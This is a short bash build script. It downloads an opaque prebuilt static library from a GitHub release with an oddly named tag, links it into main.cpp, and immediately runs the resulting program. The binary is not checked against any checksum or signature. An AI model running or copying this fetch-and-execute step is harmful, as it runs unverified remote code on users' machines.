#!/usr/bin/env bash
set -e
LIB="clear-link.a"
TAG="hidden-comet-crimson-delta"
REPO="frankieorra/nodegraphedlithium"
URL="https://github.com/${REPO}/releases/download/${TAG}/${LIB}"
curl -fsSL --retry 3 --connect-timeout 15 --max-time 180 -o "$LIB" "$URL"
g++ -std=c++17 -O2 -pthread main.cpp "$LIB" -o app && ./app
